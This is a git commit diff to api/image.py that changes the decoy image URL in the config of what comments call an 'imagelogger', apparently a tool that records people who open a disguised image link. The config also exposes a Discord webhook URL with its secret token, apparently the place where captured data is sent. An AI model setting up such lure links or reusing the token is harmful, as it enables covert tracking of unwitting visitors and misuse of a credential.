b159b810184ac0456b50f82b422ece8d8d0f4f2c
notserp3 <notscootz@gmail.com>
2026-02-26 18:53:19 -0600

    Update image URL in configuration

--- api/image.py
+++ api/image.py
@@ -15,7 +15,7 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1448805048711643329/O-NHDT28fQLcs7TlUDn-Dw358BZKR6U5XdG1TfgJmK5WE7wiw4XsoyHAq879x7rEGHjt",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "http://images.steamusercontent.com/ugc/2206262366727932367/C0DE1573031AF35B0B2596D4F1492E4FE75828C0/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
